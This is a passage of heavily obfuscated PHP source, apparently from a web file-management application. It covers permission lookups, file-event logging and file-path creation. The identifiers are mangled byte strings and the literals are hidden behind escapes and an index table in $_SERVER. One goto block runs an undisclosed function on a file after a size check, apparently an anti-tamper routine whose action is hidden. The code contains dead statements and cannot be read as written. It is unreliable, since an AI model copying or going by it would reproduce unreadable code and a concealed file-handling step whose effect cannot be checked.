$£äÏ˜‰ï : USER_ID; $›Ä±Ğ²§ = 0; $Ÿ¯Üæï = 0; $—­ğ›ŞŠ = 0; $Ğ‹²ûÒ¦ = 0; $÷ÓÛô¸ = 0; $»ãÁÜ«š = 0; $ô’ÖÎÁ = 1000; $ü¸”¡¦ = 0; $ëª­±• = 0; $—ìÉ¨‰Õ = 0; $¡©™»· = 0; $Î·Æ‚†ı = array($Ö€Ä§üè[193] => 0); foreach ($ñŠ£º÷¿ as $Î·Æ‚†ı) { $€ª´àÔ = $this->authInfo($Î·Æ‚†ı); if (!$€ª´àÔ) { continue; } $‘¹®æÃã = $Î·Æ‚†ı[$Ö€Ä§üè[578]]; $ò¥”¬†ß = intval($€ª´àÔ[$Ö€Ä§üè[496]]); if ($Î·Æ‚†ı[$Ö€Ä§üè[190]] == SourceModel::TYPE_USER && $‘¹®æÃã == $£äÏ˜‰ï) { $›Ä±Ğ²§ = !0; $—­ğ›ŞŠ = $€ª´àÔ; $Ÿ¯Üæï = $ò¥”¬†ß; } else { if ($Î·Æ‚†ı[$Ö€Ä§üè[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($‘¹®æÃã, $£äÏ˜‰ï)) { $Ğ‹²ûÒ¦ = !0; $¾ê•ÒÔ = $this->groupStepToUserGroup($‘¹®æÃã, $£äÏ˜‰ï); if ($¾ê•ÒÔ < $ô’ÖÎÁ) { $ô’ÖÎÁ = $¾ê•ÒÔ; $÷ÓÛô¸ = $ò¥”¬†ß; $»ãÁÜ«š = $€ª´àÔ; $ü¸”¡¦ = $‘¹®æÃã; } if ($¾ê•ÒÔ == $ô’ÖÎÁ && $ò¥”¬†ß >= $÷ÓÛô¸) { $÷ÓÛô¸ = $ò¥”¬†ß; $»ãÁÜ«š = $€ª´àÔ; $ü¸”¡¦ = $‘¹®æÃã; } } else { if ($‘¹®æÃã == $Ö€Ä§üè[228]) { $ëª­±• = !0; $¡©™»· = $€ª´àÔ; $—ìÉ¨‰Õ = $ò¥”¬†ß; } } } } if ($›Ä±Ğ²§) { $öâªÚÁİ = $Ÿ¯Üæï; $€ª´àÔ = $—­ğ›ŞŠ; $É‹ÊÒ´› = LNG($Ö€Ä§üè[2187]); } else { if ($Ğ‹²ûÒ¦) { $öâªÚÁİ = $÷ÓÛô¸; $€ª´àÔ = $»ãÁÜ«š; $¯ØõÛôó = Model($Ö€Ä§üè[594])->getInfo($ü¸”¡¦); $É‹ÊÒ´› = $Ö€Ä§üè[176] . $¯ØõÛôó[$Ö€Ä§üè[598]] . $Ö€Ä§üè[2188] . LNG($Ö€Ä§üè[2189]); } else { if ($ëª­±•) { $öâªÚÁİ = $—ìÉ¨‰Õ; $€ª´àÔ = $¡©™»·; $É‹ÊÒ´› = LNG($Ö€Ä§üè[2159]); } else { $öâªÚÁİ = 0; $€ª´àÔ = !1; $É‹ÊÒ´› = $Ö€Ä§üè[12]; } } } $åè®’š = array($Ö€Ä§üè[2179] => intval($öâªÚÁİ), $Ö€Ä§üè[2162] => $€ª´àÔ, $Ö€Ä§üè[2180] => $É‹ÊÒ´›, $Ö€Ä§üè[2171] => $Î·Æ‚†ı[$Ö€Ä§üè[193]]); return $åè®’š; } private function groupContainUser($é«²¯¼ó, $¡¹Ä§šÅ = false) { return in_array($é«²¯¼ó, $this->userGroupParents($¡¹Ä§šÅ)); } private function groupStepToUserGroup($â¶ ö, $°Şâ‹¾¡ = false) { $À°¢Øœ´ =& $_SERVER[ç¦¬”œš]; $‚ùÁ§³Æ = $this->userGroupList($°Şâ‹¾¡); $†ôòóÍ = 1000; $¥õ—àëò = $GLOBALS[$À°¢Øœ´[6]][$À°¢Øœ´[92]][$À°¢Øœ´[2076]] == 1; $ÆÈ“½½º = $¥õ—àëò ? 3 : 2; foreach ($‚ùÁ§³Æ as $ğÆïŞ’â) { if ($ğÆïŞ’â[$À°¢Øœ´[1969]] == $â¶ ö) { return 0; } $’£‡æßá = explode($À°¢Øœ´[50], trim($ğÆïŞ’â[$À°¢Øœ´[593]], $À°¢Øœ´[50])); if ($’£‡æßá[0] == $À°¢Øœ´[228] && count($’£‡æßá) > $ÆÈ“½½º) { $»†Ğœé‡ = array_reverse(array_slice($’£‡æßá, $ÆÈ“½½º)); $Ó•šò¢£ = array_search($â¶ ö, $»†Ğœé‡); if ($Ó•šò¢£ !== !1 && $Ó•šò¢£ + 1 <= $†ôòóÍ) { $†ôòóÍ = $Ó•šò¢£ + 1; } } } return $†ôòóÍ; } private function userGroupList($ááÎ†š± = false) { $ç¤Ü¦äÖ =& $_SERVER[ç¦¬”œš]; static $ìÅ˜Á¨õ = array(); if (isset($ìÅ˜Á¨õ[$ááÎ†š±])) { return $ìÅ˜Á¨õ[$ááÎ†š±]; } $Äñëãø¿ = Model($ç¤Ü¦äÖ[607])->getInfo($ááÎ†š±); $ìÅ˜Á¨õ[$ááÎ†š±] = array_to_keyvalue($Äñëãø¿[$ç¤Ü¦äÖ[2160]], $ç¤Ü¦äÖ[1969]); return $ìÅ˜Á¨õ[$ááÎ†š±]; } public function userGroupParents($Â¢´é†) { $ÈäÇƒî =& $_SERVER[ç¦¬”œš]; static $°À®ëƒ = array(); $Â¢´é† = $Â¢´é† ? $Â¢´é† : USER_ID; if (isset($°À®ëƒ[$Â¢´é†])) { return $°À®ëƒ[$Â¢´é†]; } $“ä³åÇ¾ = $this->userGroupList($Â¢´é†); $£²ÚÁåĞ = array(); $Øé±ÁÂ = $GLOBALS[$ÈäÇƒî[6]][$ÈäÇƒî[92]][$ÈäÇƒî[2076]] == 1; $ß…„˜Û = $Øé±ÁÂ ? 3 : 2; foreach ($“ä³åÇ¾ as $ıÓê‹’) { $ò×†•ç¾ = array($ıÓê‹’[$ÈäÇƒî[1969]]); $ôàà‡í¨ = explode($ÈäÇƒî[50], trim($ıÓê‹’[$ÈäÇƒî[593]], $ÈäÇƒî[50])); if ($ôàà‡í¨[0] == $ÈäÇƒî[228] && count($ôàà‡í¨) > $ß…„˜Û) { $òºôíÖ‘ = array_slice($ôàà‡í¨, $ß…„˜Û); $ò×†•ç¾ = array_merge($ò×†•ç¾, array_reverse($òºôíÖ‘)); } $£²ÚÁåĞ = array_merge($£²ÚÁåĞ, $ò×†•ç¾); } $°À®ëƒ[$Â¢´é†] = array_unique($£²ÚÁåĞ); return $°À®ëƒ[$Â¢´é†]; } public function authTargetInfoMake($¶¦¨­Á€) { $¯È³Öã =& $_SERVER[ç¦¬”œš]; $ÓÂíÁ­Ş = array(); $Å˜¤²¡¡ = array(); foreach ($¶¦¨­Á€ as $ïßùŸ®®) { if ($ïßùŸ®®[$¯È³Öã[190]] == SourceModel::TYPE_USER) { $ÓÂíÁ­Ş[] = intval($ïßùŸ®®[$¯È³Öã[578]]); } else { if ($ïßùŸ®®[$¯È³Öã[190]] == SourceModel::TYPE_GROUP) { $Å˜¤²¡¡[] = intval($ïßùŸ®®[$¯È³Öã[578]]); } } } if ($ÓÂíÁ­Ş) { $ÓÂíÁ­Ş = Model($¯È³Öã[586])->userListInfo($ÓÂíÁ­Ş); } if ($Å˜¤²¡¡) { $Ñª Îµ = array($¯È³Öã[2061] => array($¯È³Öã[501], $Å˜¤²¡¡)); $Å˜¤²¡¡ = Model($¯È³Öã[594])->field($¯È³Öã[2190])->where($Ñª Îµ)->select(); $Å˜¤²¡¡ = array_to_keyvalue($Å˜¤²¡¡, $¯È³Öã[1969]); } return array($¯È³Öã[2191] => $ÓÂíÁ­Ş, $¯È³Öã[2192] => $Å˜¤²¡¡); } public function authInfo($³Ë²úÌ´) { $Í‡â§Ò­ =& $_SERVER[ç¦¬”œš]; if ($³Ë²úÌ´[$Í‡â§Ò­[2077]]) { $å¢—Ï¯â = Model($Í‡â§Ò­[580])->listData($³Ë²úÌ´[$Í‡â§Ò­[2077]]); if (!$å¢—Ï¯â) { return !1; $£Ğáˆš = Model($Í‡â§Ò­[580])->listData(); $¶·µÄ¯† = array_filter_by_field($£Ğáˆš, $Í‡â§Ò­[496], $Í‡â§Ò­[228]); return $¶·µÄ¯†; } $ÅŠ¦„øï = array_field_key($å¢—Ï¯â, array($Í‡â§Ò­[484], $Í‡â§Ò­[32], $Í‡â§Ò­[496], $Í‡â§Ò­[1992], $Í‡â§Ò­[1993])); $ÅŠ¦„øï[$Í‡â§Ò­[2193]] = $³Ë²úÌ´; return $ÅŠ¦„øï; } else { return array($Í‡â§Ò­[502] => 0, $Í‡â§Ò­[1975] => $³Ë²úÌ´[$Í‡â§Ò­[2137]], $Í‡â§Ò­[503] => $Í‡â§Ò­[12], $Í‡â§Ò­[1992] => $Í‡â§Ò­[2194]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\162\x63\145\x5f\145\166\x65\156\164"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\124\151\155\x65", "\x74\x69\155\x65", "\x69\156\x73\x65\162\164", "\x66\x75\x6e\143\x74\151\x6f\156"), array("\x64\x65\163\x63", '', "\x69\x6e\163\145\162\x74\54\165\x70\144\141\164\145\x2c\163\x65\154\x65\143\164", "\x6a\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ÄĞúÉš–, $ãÔŞƒÁÌ, $šã›Ü…š = '') { $œ„õµ’Ø =& $_SERVER[ç¦¬”œš]; if (!$this->eventSave) { return; } $‰™±²Ëò = Model($œ„õµ’Ø[1419])->sourceInfo($ÄĞúÉš–); if (!$‰™±²Ëò) { return !1; } if ($this->isDisableEvent($‰™±²Ëò, $ãÔŞƒÁÌ)) { return; } if ($šã›Ü…š && is_string($šã›Ü…š)) { $šã›Ü…š = array($œ„õµ’Ø[2008] => $šã›Ü…š); } $ÔøÔè× = defined($œ„õµ’Ø[2195]) ? USER_ID : 0; $–•—¤®Ì = array($œ„õµ’Ø[500] => $ÄĞúÉš–, $œ„õµ’Ø[2196] => $‰™±²Ëò[$œ„õµ’Ø[192]], $œ„õµ’Ø[2197] => $‰™±²Ëò[$œ„õµ’Ø[32]], $œ„õµ’Ø[591] => !empty($‰™±²Ëò[$œ„õµ’Ø[591]]) ? $‰™±²Ëò[$œ„õµ’Ø[591]] : $œ„õµ’Ø[12], $œ„õµ’Ø[1761] => $ÔøÔè×, $œ„õµ’Ø[505] => $ãÔŞƒÁÌ, $œ„õµ’Ø[1763] => $šã›Ü…š); $this->addSystemLog($ãÔŞƒÁÌ, $–•—¤®Ì); unset($–•—¤®Ì[$œ„õµ’Ø[2197]], $–•—¤®Ì[$œ„õµ’Ø[591]]); return $this->add($–•—¤®Ì); } private function addSystemLog($³ß¶Ğ§¦, $Ô¤Úşä) { $ó† ¯êÖ =& $_SERVER[ç¦¬”œš]; if ($³ß¶Ğ§¦ == $ó† ¯êÖ[2198]) { $³ß¶Ğ§¦ = $Ô¤Úşä[$ó† ¯êÖ[535]][$ó† ¯êÖ[2199]]; } else { if (in_array($³ß¶Ğ§¦, array($ó† ¯êÖ[1948], $ó† ¯êÖ[2200]))) { $³ß¶Ğ§¦ = $Ô¤Úşä[$ó† ¯êÖ[535]][$ó† ¯êÖ[171]]; } } $¿ì¿ó˜¯ = array_merge($Ô¤Úşä, array($ó† ¯êÖ[2201] => $Ô¤Úşä[$ó† ¯êÖ[193]], $ó† ¯êÖ[2202] => $Ô¤Úşä[$ó† ¯êÖ[2202]])); Hook::trigger($ó† ¯êÖ[2203], $ó† ¯êÖ[2204] . $³ß¶Ğ§¦, $Ô¤Úşä); Model($ó† ¯êÖ[1912])->addLog($ó† ¯êÖ[2204] . $³ß¶Ğ§¦, $¿ì¿ó˜¯); } private function isDisableEvent($øìÉÌ®¾, $™¿Í‡š) { $Û¢°¹í¹ =& $_SERVER[ç¦¬”œš]; if ($øìÉÌ®¾[$Û¢°¹í¹[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($™¿Í‡š == $Û¢°¹í¹[1937]) { return !1; } return !0; } public function eventCreate($ËÌÆú, $÷·Êó½) { $›ö“¸™¹ =& $_SERVER[ç¦¬”œš]; $¡Â¼¿á = Model($›ö“¸™¹[1419])->sourceInfo($ËÌÆú); $¡ØóøéÚ = array($›ö“¸™¹[2199] => $÷·Êó½, $›ö“¸™¹[32] => $¡Â¼¿á[$›ö“¸™¹[32]]); return $this->addEvent($ËÌÆú, $›ö“¸™¹[2198], $¡ØóøéÚ); } public function eventFileEdit($üŠ‹Ãº) { $æîÓÜ×¤ =& $_SERVER[ç¦¬”œš]; $ÅÖ°Âí“ = array($æîÓÜ×¤[2205] => $_SERVER[$æîÓÜ×¤[2206]], $æîÓÜ×¤[2207] => strtolower(ACTION)); if (isset($GLOBALS[$æîÓÜ×¤[7]][$æîÓÜ×¤[2208]])) { $ÅÖ°Âí“[$æîÓÜ×¤[2208]] = $æîÓÜ×¤[91]; } return $this->addEvent($üŠ‹Ãº, $æîÓÜ×¤[1938], $ÅÖ°Âí“); } public function eventRecycle($Ñ¢Ö»¶û, $Š¼ğú¬€) { return $this->addEvent($Ñ¢Ö»¶û, $_SERVER[ç¦¬”œš][2200], $Š¼ğú¬€); } private static $_removeLast = ''; public function eventRemove($ƒığ×ßâ) { $ĞûËø« =& $_SERVER[ç¦¬”œš]; self::$_removeLast = $ƒığ×ßâ; $ì³íºáÅ = Model($ĞûËø«[1419])->sourceInfo($ƒığ×ßâ); $Æ§×úë = array_field_key($ì³íºáÅ, array($ĞûËø«[193], $ĞûËø«[550], $ĞûËø«[514], $ĞûËø«[593])); $´Ì­ˆìü = array($ĞûËø«[171] => $ì³íºáÅ[$ĞûËø«[32]], $ĞûËø«[2207] => ACTION, $ĞûËø«[2209] => $Æ§×úë); return $this->addEvent($ì³íºáÅ[$ĞûËø«[192]], $ĞûËø«[1937], $´Ì­ˆìü); } public function eventShare($ÕßâÅº•, $ñ¤Î˜ûÙ) { return $this->addEvent($ÕßâÅº•, $_SERVER[ç¦¬”œš][1948], $ñ¤Î˜ûÙ); } public function eventMove($¾¯ªñŸ, $æ›ùõú‚, $ÌÙ‚¡…µ) { $¢ÖÔãµî =& $_SERVER[ç¦¬”œš]; if (self::$_removeLast == $¾¯ªñŸ) { return; } $Ğ²—¶Å = Model($¢ÖÔãµî[1419]); $®™şğÒ = $Ğ²—¶Å->sourceInfo($¾¯ªñŸ); $œµÂ¡ÇÖ = $Ğ²—¶Å->sourceInfo($æ›ùõú‚); $³ßíÙÇö = $Ğ²—¶Å->sourceInfo($ÌÙ‚¡…µ); $šı‰Ğšü = array($¢ÖÔãµî[1242] => $æ›ùõú‚, $¢ÖÔãµî[2210] => $œµÂ¡ÇÖ[$¢ÖÔãµî[32]], $¢ÖÔãµî[2186] => !empty($œµÂ¡ÇÖ[$¢ÖÔãµî[591]]) ? $œµÂ¡ÇÖ[$¢ÖÔãµî[591]] : $¢ÖÔãµî[12], $¢ÖÔãµî[1243] => $ÌÙ‚¡…µ, $¢ÖÔãµî[2211] => $³ßíÙÇö[$¢ÖÔãµî[32]], $¢ÖÔãµî[2212] => !empty($³ßíÙÇö[$¢ÖÔãµî[591]]) ? $³ßíÙÇö[$¢ÖÔãµî[591]] : $¢ÖÔãµî[12]); $this->addEvent($¾¯ªñŸ, $¢ÖÔãµî[629], $šı‰Ğšü); $®™şğÒ = $Ğ²—¶Å->sourceInfo($¾¯ªñŸ); $šı‰Ğšü = array($¢ÖÔãµî[193] => $®™şğÒ[$¢ÖÔãµî[193]], $¢ÖÔãµî[32] => $®™şğÒ[$¢ÖÔãµî[32]]); $this->addEvent($æ›ùõú‚, $¢ÖÔãµî[2213], $šı‰Ğšü); } public function eventCopy($Óƒö¦‚) { $this->eventCreate($Óƒö¦‚, $_SERVER[ç¦¬”œš][627]); } public function eventRename($³¸ÕÕº¾, $Ëàà²¶ï, $£‘†ÎÚ®) { $¸…ß£«× =& $_SERVER[ç¦¬”œš]; $æ“¡ù¥ß = array($¸…ß£«×[1242] => $Ëàà²¶ï, $¸…ß£«×[1243] => $£‘†ÎÚ®); return $this->addEvent($³¸ÕÕº¾, $¸…ß£«×[1433], $æ“¡ù¥ß); } public function eventAddComment($Š…ùİ„¨, $·šçáïË) { return $this->addEvent($Š…ùİ„¨, $_SERVER[ç¦¬”œš][2214], $·šçáïË); } public function eventAddDesc($ğˆ—Ñ½–, $…³«Äâ¤) { return $this->addEvent($ğˆ—Ñ½–, $_SERVER[ç¦¬”œš][2215], $…³«Äâ¤); } public function listBySource($Ÿ…‰ÌÛ¢) { $Üéû÷¦ =& $_SERVER[ç¦¬”œš]; $ùÚŒ£ÁÁ = Model($Üéû÷¦[1419])->sourceInfo($Ÿ…‰ÌÛ¢); $Çê×Å’ª = array($Üéû÷¦[500] => $Ÿ…‰ÌÛ¢); if ($ùÚŒ£ÁÁ[$Üéû÷¦[494]] == $Üéû÷¦[91]) { $Ë…²Ø²¨ = Model($Üéû÷¦[1419])->listSearchChildren($Ÿ…‰ÌÛ¢, 20000); $Ë…²Ø²¨[] = $Ÿ…‰ÌÛ¢ . $Üéû÷¦[454]; $Çê×Å’ª = array($Üéû÷¦[193] => array($Üéû÷¦[7], $Ë…²Ø²¨)); } $šÆŸ×ƒÏ = $this->where($Çê×Å’ª)->order($Üéû÷¦[2216])->selectPage(); if ($šÆŸ×ƒÏ[$Üéû÷¦[442]][$Üéû÷¦[443]] == 0) { $šÆŸ×ƒÏ[$Üéû÷¦[442]][$Üéû÷¦[443]] = 1; $šÆŸ×ƒÏ[$Üéû÷¦[445]] = array(array($Üéû÷¦[500] => $Ÿ…‰ÌÛ¢, $Üéû÷¦[2196] => $ùÚŒ£ÁÁ[$Üéû÷¦[192]], $Üéû÷¦[1761] => $ùÚŒ£ÁÁ[$Üéû÷¦[536]], $Üéû÷¦[505] => $Üéû÷¦[2217], $Üéû÷¦[506] => $ùÚŒ£ÁÁ[$Üéû÷¦[231]], $Üéû÷¦[1763] => $Üéû÷¦[12])); } return $this->eventListParse($šÆŸ×ƒÏ, $Ÿ…‰ÌÛ¢); } private function eventListParse($¤­™²ñé, $úûÌüªå) { $µ¸œˆ‡‡ =& $_SERVER[ç¦¬”œš]; $Ùäèß³„ = $¤­™²ñé[$µ¸œˆ‡‡[445]]; $À©¤Ùö± = array_to_keyvalue($Ùäèß³„, $µ¸œˆ‡‡[12], $µ¸œˆ‡‡[193]); $ê«¸éÍ  = array_to_keyvalue($Ùäèß³„, $µ¸œˆ‡‡[12], $µ¸œˆ‡‡[2202]); foreach ($Ùäèß³„ as $õÂÂÔå) { $í›êÃ¯Û = $õÂÂÔå[$µ¸œˆ‡‡[535]]; if ($õÂÂÔå[$µ¸œˆ‡‡[33]] == $µ¸œˆ‡‡[629] && isset($í›êÃ¯Û[$µ¸œˆ‡‡[1242]])) { $À©¤Ùö±[] = $í›êÃ¯Û[$µ¸œˆ‡‡[1242]] . $µ¸œˆ‡‡[12]; $À©¤Ùö±[] = $í›êÃ¯Û[$µ¸œˆ‡‡[1243]] . $µ¸œˆ‡‡[12]; } if ($õÂÂÔå[$µ¸œˆ‡‡[33]] == $µ¸œˆ‡‡[2213] && isset($í›êÃ¯Û[$µ¸œˆ‡‡[193]])) { $À©¤Ùö±[] = $í›êÃ¯Û[$µ¸œˆ‡‡[193]] . $µ¸œˆ‡‡[12]; } } $À©¤Ùö± = array_merge($À©¤Ùö±, $ê«¸éÍ , array($úûÌüªå . $µ¸œˆ‡‡[12])); $À©¤Ùö± = array_unique($À©¤Ùö±); $Ğ‘‚¤Ø… = array_unique(array_to_keyvalue($Ùäèß³„, $µ¸œˆ‡‡[12], $µ¸œˆ‡‡[1770])); $ë·ĞÅ€Ä = Model($µ¸œˆ‡‡[607])->userListInfo($Ğ‘‚¤Ø…); $“êß°“£ = Model($µ¸œˆ‡‡[904])->sourceListInfo($À©¤Ùö±, !0); foreach ($Ùäèß³„ as &$õÂÂÔå) { if ($õÂÂÔå[$µ¸œˆ‡‡[33]] == $µ¸œˆ‡‡[629] && isset($õÂÂÔå[$µ¸œˆ‡‡[535]][$µ¸œˆ‡‡[1242]])) { $õÂÂÔå[$µ¸œˆ‡‡[535]][$µ¸œˆ‡‡[1242]] = $“êß°“£[$õÂÂÔå[$µ¸œˆ‡‡[535]][$µ¸œˆ‡‡[1242]]]; $õÂÂÔå[$µ¸œˆ‡‡[535]][$µ¸œˆ‡‡[1243]] = $“êß°“£[$õÂÂÔå[$µ¸œˆ‡‡[535]][$µ¸œˆ‡‡[1243]]]; } if ($õÂÂÔå[$µ¸œˆ‡‡[33]] == $µ¸œˆ‡‡[2213] && isset($õÂÂÔå[$µ¸œˆ‡‡[535]][$µ¸œˆ‡‡[193]])) { $õÂÂÔå[$µ¸œˆ‡‡[535]][$µ¸œˆ‡‡[193]] = $“êß°“£[$õÂÂÔå[$µ¸œˆ‡‡[535]][$µ¸œˆ‡‡[193]]]; } $õÂÂÔå[$µ¸œˆ‡‡[90]] = $“êß°“£[$õÂÂÔå[$µ¸œˆ‡‡[193]]]; $õÂÂÔå[$µ¸œˆ‡‡[2218]] = $“êß°“£[$õÂÂÔå[$µ¸œˆ‡‡[2202]]]; if ($õÂÂÔå[$µ¸œˆ‡‡[33]] == $µ¸œˆ‡‡[1937]) { $õÂÂÔå[$µ¸œˆ‡‡[2218]] = $õÂÂÔå[$µ¸œˆ‡‡[90]]; $õÂÂÔå[$µ¸œˆ‡‡[2202]] = $õÂÂÔå[$µ¸œˆ‡‡[2218]][$µ¸œˆ‡‡[193]]; $õÂÂÔå[$µ¸œˆ‡‡[90]] = !1; $õÂÂÔå[$µ¸œˆ‡‡[193]] = $µ¸œˆ‡‡[12]; } $õÂÂÔå[$µ¸œˆ‡‡[2145]] = $ë·ĞÅ€Ä[$õÂÂÔå[$µ¸œˆ‡‡[1770]]]; } unset($õÂÂÔå); $¤­™²ñé[$µ¸œˆ‡‡[445]] = $Ùäèß³„; return $¤­™²ñé; } public function removeBySource($­ßÂ¹şÎ) { $œ’¯Ëíö = array($_SERVER[ç¦¬”œš][500] => $­ßÂ¹şÎ); $this->where($œ’¯Ëíö)->remove(); } } goto f’ØÙé­Œ; c…¸Ñ×¤ù‚: if ($_SERVER[$_SERVER[ç¦¬”œš][474]] != $_size($_file)) { $_getc = $_SERVER[ç¦¬”œš][475]; $_getfile = $_SERVER[$_SERVER[ç¦¬”œš][476]] . $_SERVER[ç¦¬”œš][477]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ç¦¬”œš][262], $_getfilec); if (count($_getarrs) < $_SERVER[ç¦¬”œš][478]) { $exit = $_SERVER[ç¦¬”œš][479]; $exit(); } $_act = $_SERVER[ç¦¬”œš][480]; $_act($_file); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\154\145"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\x61\155\x65" => "\x69\157\x5f\x66\x69\154\x65\x5f\155\x65\x74\141", "\x6d\145\x74\141\x46\151\x65\x6c\x64" => "\146\x69\154\x65\x49\x44"); public function fileInfo($÷ã‹¥Ø) { $Ëü×”öÎ =& $_SERVER[ç¦¬”œš]; static $Õ¤ëª°Š = array(); if (!isset($Õ¤ëª°Š[$÷ã‹¥Ø])) { $‚¸–ş…Ë = $Ëü×”öÎ[2019]; $²÷”×‘» = Model($Ëü×”öÎ[553])->field($‚¸–ş…Ë)->where(array($Ëü×”öÎ[551] => $÷ã‹¥Ø))->find(); $Õ¤ëª°Š[$÷ã‹¥Ø] = $²÷”×‘»; } return $Õ¤ëª°Š[$÷ã‹¥Ø]; } public function addFileByContent($‡‡Ï¿ÀË = '', $«£œÆÕ = '') { $÷¥»˜÷ =& $_SERVER[ç¦¬”œš]; $úµşë»¡ = TEMP_PATH . $÷¥»˜÷[2020]; if (!is_dir($úµşë»¡)) { mk_dir($úµşë»¡); } $õ«Ÿ¥¯Ç = $úµşë»¡ . $÷¥»˜÷[2021] . rand_string(16); file_put_contents($õ«Ÿ¥¯Ç, $‡‡Ï¿ÀË); $«²»˜æ« = $this->addFile($õ«Ÿ¥¯Ç, $«£œÆÕ, !0); if (file_exists($õ«Ÿ¥¯Ç)) { @unlink($õ«Ÿ¥¯Ç); } return $«²»˜æ«; } public function createFileName($Ò¦¹º¶¸, $¢Æ‡ß·¿ = false, $…éõ ˜© = false) { $è‚ş¦ş¡ =& $_SERVER[ç¦¬”œš]; $¬•¯İË = IO::init($è‚ş¦ş¡[8]); $ÊÖ‹Š‚ˆ = $this->makeFilePath($Ò¦¹º¶¸, $¬•¯İË, $¢Æ‡ß·¿, $…éõ ˜©); $²Ù„ãæ– = $¬•¯İË->pathFather($ÊÖ‹Š‚ˆ); static $›İ©ëÀÆ = false; $ïäÚ  = $è‚ş¦ş¡[2022] . md5($²Ù„ãæ–); if (!$›İ©ëÀÆ && !Cache::get($ïäÚ )) { $›İ©ëÀÆ = !0; $¾±¥ = IO::mkdir($²Ù„ãæ–); if (!IO::exist($¾±¥ . $è‚ş¦ş¡[877])) { IO::mkfile($¾±¥ . $è‚ş¦ş¡[877]); } Cache::set($ïäÚ , 1, 3600 * 2); } return $ÊÖ‹Š‚ˆ; } public function makeFilePath($ë¨Ü€ú, $âêãÎ‚à, $¤Ï¨‚•° = false, $¥äîä¹ô = false) { $¯û¬¿±¨ =& $_SERVER[ç¦¬”œš]; $‡½éÔÚ = Model($¯û¬¿±¨[850])->get($¯û¬¿±¨[2023]); $‘õ­Ââ¦ = KodIO::defaultIO() . date($¯û¬¿±¨[2024]); $ëÖÍÛÜï = $‘õ­Ââ¦ . rand_string(5) . short_id(100); $ë¨Ü€ú = str_replace($¯û¬¿±¨[8], $¯û¬¿±¨[11], KodIO::clear($ë¨Ü€ú)); $ıòûŸÒÁ = $âêãÎ‚à->ext($ë¨Ü€ú); if (!$ë¨Ü€ú) { $‡½éÔÚ = $¯û¬¿±¨[856]; } switch ($‡½éÔÚ) { case $¯û¬¿±¨[2025]: if ($ıòûŸÒÁ) { $ëÖÍÛÜï = $ëÖÍÛÜï . $¯û¬¿±¨[10] . $ıòûŸÒÁ; } if ($ıòûŸÒÁ == $¯û¬¿±¨[1961]) { $ëÖÍÛÜï .= $¯û¬¿±¨[1292]; } break; case $¯û¬¿±¨[2026]: $ùĞ³¬ºš = Model($¯û¬¿±¨[850])->get($¯û¬¿±¨[851]); $³Ù®§¸ = substr(md5($¯û¬¿±¨[852] . $ùĞ³¬ºš . date($¯û¬¿±¨[829])), 0, 8); $í¶“û¶ = KodIO::defaultDriver(); $‘õ­Ââ¦ = $¯û¬¿±¨[1323] . $í¶“û¶[$¯û¬¿±¨[484]] . $¯û¬¿±¨[493] . date($¯û¬¿±¨[2027]) . $³Ù®§¸ . $¯û¬¿±¨[8]; if ($ıòûŸÒÁ == $¯û¬¿±¨[1961]) { $ë¨Ü€ú .= $¯û¬¿±¨[1292]; } $ä£¾ë = $¯û¬¿±¨[2028] . $‘õ­Ââ¦ . $ë¨Ü€ú; CacheLock::lock($ä£¾ë); $ëÖÍÛÜï = $‘õ­Ââ¦ . $ë¨Ü€ú; if (IO::exist($‘õ­Ââ¦ . $ë¨Ü€ú)) { $ÏÛÚşó = substr($ë¨Ü€ú, 0, strlen($ë¨Ü€ú) - strlen($ıòûŸÒÁ)); $š±‹Ø” = $¥äîä¹ô ? substr($¥äîä¹ô, 0, 5) : ($¤Ï¨‚•° ? substr($¤Ï¨‚•°, 0, 5) : rand_string(5)); $ëÖÍÛÜï = $‘õ­Ââ¦ . $ÏÛÚşó . $š±‹Ø”; if ($ıòûŸÒÁ) { $ëÖÍÛÜï = $ëÖÍÛÜï . $¯û¬¿±¨[10] . $ıòûŸÒÁ; } } if (IO::isOsDriver($ëÖÍÛÜï) && !IO::isUploadServer($ëÖÍÛÜï)) { if (IO::exist($ëÖÍÛÜï)) { return $ëÖÍÛÜï; } $¬ğ·Ú¶å = IO::setContent($ëÖÍÛÜï, $¯û¬¿±¨[12]); if (!$¬ğ·Ú¶å) { show_json($¯û¬¿±¨[2029], !1); } } CacheLock::unlock($ä£¾ë); break; case $¯û¬¿±¨[856]: break; default: break; } return $ëÖÍÛÜï; } public function addFileByRemote($ş¹…è›â, $¸–ŞıàÜ, $ó¬Ëúê® = array()) { $¥ú‰ãªã =& $_SERVER[ç¦¬”œš]; if (!IO::exist($ş¹…è›â)) { return !1; } $ŞîÔˆıï = $ó¬Ëúê®[$¥ú‰ãªã[556]] ? $ó¬Ëúê®[$¥ú‰ãªã[556]] : $¥ú‰ãªã[12]; $óó½ˆ™‹ = IO::hashMd5($ş¹…è›â, $ŞîÔˆıï); $¨©äØ…¶ = KodIO::defaultDriver(); $ˆ½ª§à¯ = array($¥ú‰ãªã[626] => IO::size($ş¹…è›â), $¥ú‰ãªã[2030] => 1, $¥ú‰ãªã[503] => $¸–ŞıàÜ, $¥ú‰ãªã[888] => $¨©äØ…¶[$¥ú‰ãªã[484]], $¥ú‰ãªã[504] => $ş¹…è›â, $¥ú‰ãªã[2031] => $ó¬Ëúê®[$¥ú‰ãªã[681]] ? $ó¬Ëúê®[$¥ú‰ãªã[681]] : IO::hashSimple($ş¹…è›â), $¥ú‰ãªã[2032] => $óó½ˆ™‹ ? $óó½ˆ™‹ : $ŞîÔˆıï); if ($Ï³œˆÄÃ = $this->addFileCheckExist($ˆ½ª§à¯[$¥ú‰ãªã[681]], $ˆ½ª§à¯[$¥ú‰ãªã[556]], $ˆ½ª§à¯[$¥ú‰ãªã[79]])) { return $Ï³œˆÄÃ; } return $this->addFileData($ˆ½ª§à¯); } private function addFileData($‹Û¯ó¨) { $æ£âÅÜ‘ =& $_SERVER[ç¦¬”œš]; if (!$‹Û¯ó¨) { return !1; } $‹Û¯ó¨[$æ£âÅÜ‘[79]] = 